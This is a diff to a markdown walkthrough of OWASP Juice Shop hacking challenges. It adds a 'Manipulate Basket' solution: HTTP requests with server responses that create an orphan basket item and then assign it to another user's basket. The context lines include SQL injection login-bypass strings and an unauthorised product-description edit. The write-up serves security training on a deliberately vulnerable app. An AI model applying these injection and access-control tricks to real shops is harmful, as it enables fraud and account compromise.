@@ -318,6 +318,42 @@ Email is easy. Once you have the admin access, you can see it in _Administration
 To bypass the password check, we can use a simple SQL injection:
 `jim@juice-sh.op';` or `jim@juice-sh.op'--`
 
+## Manipulate Basket (Broken Access Control)
+_Put an additional product into another user's shopping basket._
+
+I found an alternative solution for this challenge which is, however, not recognized as the correct one. 
+I created Juice shop bug [#1452](https://github.com/bkimminich/juice-shop/issues/1452).
+
+### 1) Create new basket item
+```
+POST /api/BasketItems/
+Content-type: application/json
+
+{"quantity":3,"ProductId":19}
+---
+{"status":"success","data":{"id":21,"ProductId":19,"quantity":3,"updatedAt":"2020-08-26T22:22:36.821Z","createdAt":"2020-08-26T22:22:36.821Z"}}
+```
+
+The trick here is to delete the `basketId` property! New basket item is created with `null` basketId.
+Just to confirm it:
+```
+GET /api/BasketItems/21
+---
+{"status":"success","data":{"id":21,"quantity":3,"createdAt":"2020-08-26T22:22:36.821Z","updatedAt":"2020-08-26T22:22:36.821Z","BasketId":null,"ProductId":19}}
+```
+
+### 2) Add basket item to basket
+Now we can put the basket item into another user's basket (this wouldn't possible if the basket item
+had already been in someone's basket):
+```
+PUT /api/BasketItems/21
+Content-type: application/json
+
+{"BasketId":"8"}
+---
+{"status":"success","data":{"id":21,"quantity":3,"createdAt":"2020-08-26T22:22:36.821Z","updatedAt":"2020-08-26T22:23:45.932Z","BasketId":"8","ProductId":19}}
+```
+
 ## Payback Time (Improper Input Validation)
 _Place an order that makes you rich._
 
@@ -342,7 +378,7 @@ Let's use it to modify the existing product (id is `9`). Do not forget to add `C
 
 ```
 PUT /api/Products/9
-Content-Type: application/json
+Content-type: application/json
 
 {"description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"}
 ```
